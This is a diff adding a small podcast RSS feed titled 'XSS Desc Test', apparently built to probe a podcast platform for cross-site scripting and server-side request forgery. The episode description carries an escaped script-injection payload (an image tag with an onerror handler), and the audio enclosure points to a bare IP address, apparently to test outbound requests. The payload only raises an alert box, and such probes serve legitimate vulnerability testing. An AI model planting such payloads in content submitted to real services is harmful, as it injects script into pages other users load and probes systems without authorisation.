@@ -1,0 +1,17 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0" xmlns:itunes="http://www.itunes.com/dtds/podcast-1.0.dtd">
+<channel>
+<title>XSS Desc Test</title>
+<description>Security research feed</description>
+<link>https://example.com/podcast</link>
+<language>en-us</language>
+<itunes:author>Kiki Maulana</itunes:author>
+<item>
+<title>Clean Title Episode</title>
+<description>&lt;img src=x onerror=alert(6)&gt;</description>
+<guid>https://github.com/kikiemz/spreaker-ssrf-test/xss-desc1</guid>
+<pubDate>Thu, 06 Nov 2026 02:50:00 GMT</pubDate>
+<enclosure url="http://129.226.203.245/episode.mp3" length="1024" type="audio/mpeg"/>
+</item>
+</channel>
+</rss>
